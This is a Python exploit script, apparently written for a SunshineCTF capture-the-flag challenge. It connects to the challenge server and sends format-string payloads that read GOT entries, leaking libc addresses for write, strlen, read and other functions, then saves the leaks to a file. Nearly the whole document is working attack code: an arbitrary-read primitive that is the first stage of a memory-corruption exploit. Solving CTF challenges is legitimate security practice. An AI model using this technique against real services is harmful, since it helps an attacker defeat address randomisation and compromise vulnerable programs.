#!/usr/bin/env python3
import socket, struct, sys
HOST, PORT = "chal.sunshinectf.org", 26002
PROMPT = b"score> "
def p64(v): return struct.pack("<Q", v)
GOT = {"write":0x404000,"strlen":0x404008,"strcspn":0x404010,"read":0x404018,"setvbuf":0x404020}

def recv_until(s, marker):
    data=bytearray()
    while marker not in data:
        c=s.recv(4096)
        if not c: raise EOFError(bytes(data))
        data+=c
    return bytes(data)

def payload(spec, arg8, arg9=0):
    assert len(spec)<=15
    return spec.ljust(15,b"Z")+b"\0"+p64(arg8)+p64(arg9)+b"\n"

s=socket.create_connection((HOST,PORT),timeout=10)
recv_until(s,PROMPT)
leaks={}
for name,addr in GOT.items():
    s.sendall(payload(b"%8$s", addr))
    reply=recv_until(s,PROMPT)
    leak=reply.split(b"Z"*11,1)[0]
    val=int.from_bytes(leak[:6].ljust(8,b"\0"),"little")  # 6 bytes = 48-bit addr
    leaks[name]=val
    print(f"{name:8s}@GOT -> {val:#014x}  (low12={val&0xfff:#05x})")
s.close()
# save
with open("remote_leaks.txt","w") as f:
    for k,v in leaks.items(): f.write(f"{k} {v:#x}\n")
